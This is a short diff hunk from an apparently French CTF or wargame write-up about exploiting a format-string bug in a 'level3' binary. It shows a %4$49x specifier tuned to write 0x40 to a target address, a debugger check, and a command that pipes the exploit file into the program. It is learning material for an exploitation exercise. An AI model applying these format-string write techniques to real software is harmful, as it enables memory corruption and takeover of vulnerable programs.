@@ -54,4 +54,5 @@ Je teste en premier avec %4$42x dans mon exploit :
                             j'ajoute 7 pour atteindre 40 donc %4$49x.
 x 0x804988c : 0x804988c <m>:	0x00000040 -> Bingo !
 
+Redirection de l'exploit dans l'entree standard:
 cat /tmp/exploit3 - | ./level3 
